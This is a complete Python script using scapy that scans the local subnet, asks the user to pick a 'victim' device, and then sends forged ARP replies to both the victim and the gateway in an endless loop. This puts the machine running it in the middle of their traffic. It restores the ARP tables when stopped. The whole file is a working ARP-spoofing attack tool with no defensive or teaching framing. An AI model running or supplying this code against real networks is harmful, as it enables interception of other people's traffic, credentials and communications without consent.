import time
import scapy.all as scapy

# Retrieve the gateway IP and MAC address
gw = scapy.conf.route.route("0.0.0.0")[2]
gw_mac = scapy.getmacbyip(gw)

# Scanning the network to find devices
def scan():
    print("Your current default gateway is: " + gw)

    net_parts = gw.split(".")
    net = net_parts[0] + '.' + net_parts[1] + '.' + net_parts[2] + '.' + '0/24'

    arp = scapy.ARP(pdst=net)
    ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp

    result = scapy.srp(packet, timeout=2, verbose=0)[0]

    devices = []
    for sent, received in result:
        devices.append({'IP': received.psrc, 'MAC': received.hwsrc})

    print("Available devices in the network:")
    print("Index  IP Address" + " " * 18 + "MAC Address")
    for i, device in enumerate(devices):
        print(f"{i:<6} {device['IP']:<20} {device['MAC']}")

    return devices

# Function to get local IP address
def get_local_ip():
    interfaces = scapy.conf.ifaces

    for iface in interfaces:
        ip = scapy.get_if_addr(iface)
        if ip and ip != "127.0.0.1":  # Exclude loopback address
            return ip

    return "Unable to get IP address"

# Function to spoof ARP tables
def spoof(victim_ip, victim_mac, spoofed_ip):
    try:
        packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoofed_ip)
        scapy.send(packet, verbose=False)
    except Exception as e:
        print(f"Error sending spoofed packet: {e}")

# Function to restore the ARP tables to their original state
def restore(dst_ip, src_ip):
    try:
        dst_mac = scapy.getmacbyip(dst_ip)
        src_mac = scapy.getmacbyip(src_ip)
        packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
        scapy.send(packet, count=4, verbose=False)
        print(f"Restored ARP table for {dst_ip}")
    except Exception as e:
        print(f"Error restoring ARP table: {e}")

# Main program
devices = scan()
print(f"Local IP Address: {get_local_ip()}")

if not devices:
    print("No devices found on the network. Exiting.")
    exit(1)

# Allow user to select a target device
try:
    victim_index = int(input("Select the victim by index (e.g., 0, 1, 2...): "))
    if victim_index < 0 or victim_index >= len(devices):
        raise ValueError("Invalid index selected.")
except ValueError as e:
    print(f"Error: {e}. Exiting.")
    exit(1)

victim_ip = devices[victim_index]['IP']
victim_mac = devices[victim_index]['MAC']

print(f"Selected victim IP: {victim_ip}")

# Begin ARP spoofing
timeout = 2
try:
    print("ARP spoofing is ongoing. Press Ctrl+C to stop.")
    while True:
        spoof(victim_ip, victim_mac, gw)
        spoof(gw, gw_mac, victim_ip)
        time.sleep(timeout)
except KeyboardInterrupt:
    print("\nRestoring network...")
    restore(gw, victim_ip)
    restore(victim_ip, gw)
    print("Network restored. Exiting.")
